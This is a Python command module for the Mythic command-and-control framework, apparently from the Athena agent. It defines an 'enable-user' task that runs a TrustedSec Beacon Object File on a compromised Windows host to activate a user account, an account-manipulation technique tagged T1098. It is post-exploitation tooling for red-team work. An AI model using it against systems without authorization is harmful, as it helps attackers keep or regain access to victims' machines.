from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import binascii
import cmd 
import struct
import os
import subprocess
from ..athena_utils.bof_utilities import *


class EnableUserArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Required. The user name to activate/enable.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                description="Optional. The domain/computer for the account or if not specified, defaults to local.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        )
                    ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            raise ValueError("Missing arguments")
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class EnableUserCommand(CoffCommandBase):
    cmd = "enable-user"
    needs_admin = False
    help_cmd = """
Command: enable-user
Summary: Activates (and if necessary enables) the specified user account on the target computer. 
Usage:   enable-user -username checkymander [-domain METEOR]
         username  Required. The user name to activate/enable. 
         domain    Optional. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account.
                   
Credit: The TrustedSec team for the original BOF. - https://github.com/trustedsec/CS-Remote-OPs-BOF"""
    description = """Activates (and if necessary enables) the specified user account on the target computer."""
    version = 1
    script_only = True
    supported_ui_features = ["T1098"]
    author = "@TrustedSec"
    argument_class = EnableUserArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")


        bof_path = f"/Mythic/athena/mythic/agent_functions/trusted_sec_remote_bofs/enableuser/enableuser.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await compile_bof("/Mythic/athena/mythic/agent_functions/trusted_sec_remote_bofs/enableuser/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as f:
            coff_file = f.read()

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                taskData.Task.ID,
                DeleteAfterFetch = True,
                FileContents = coff_file,
            ))
        encoded_args = ""
        OfArgs = []

        domain = taskData.args.get_arg("domain")

        if not domain:
            OfArgs.append(generateWString("\\")) # Default to local account
        else:
            OfArgs.append(generateWString(domain))
            
        username = taskData.args.get_arg("username")
        OfArgs.append(generateWString(username))


        encoded_args = base64.b64encode(SerializeArgs(OfArgs)).decode()
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="coff",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "coffFile": file_resp.AgentFileId,
                "functionName": "go",
                "arguments": encoded_args,
                "timeout": "60",
            }),
            Token=taskData.Task.TokenID,
        ))

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass

